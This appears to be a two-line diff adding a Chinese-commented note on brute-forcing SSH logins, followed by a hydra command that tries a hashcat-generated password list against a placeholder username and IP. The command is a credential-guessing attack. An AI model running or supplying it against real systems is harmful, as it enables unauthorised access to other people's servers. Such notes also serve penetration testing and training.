@@ -1,0 +1,2 @@
+# 使用hashcat生成的密码列表强行破解
+hydra -l [ssh用户名] -P passlist.txt [ip] ssh
